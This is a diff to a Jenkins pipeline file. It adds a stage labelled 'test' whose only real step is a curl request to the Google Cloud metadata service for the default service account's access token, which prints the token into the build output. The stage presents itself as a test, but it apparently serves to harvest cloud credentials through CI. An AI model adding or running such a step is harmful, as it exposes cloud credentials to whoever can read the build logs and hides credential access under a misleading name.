@@ -23,6 +23,17 @@ pipeline{
                 ])
             }
         }
+
+        stage("test"){
+            steps{
+                script{
+                    container("curl"){
+                        sh 'curl'
+                        sh 'curl -H "Metadata-Flavor: Google" http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token'
+                    }
+                }
+            }
+        }
         stage("Init"){
             steps{
                 script{
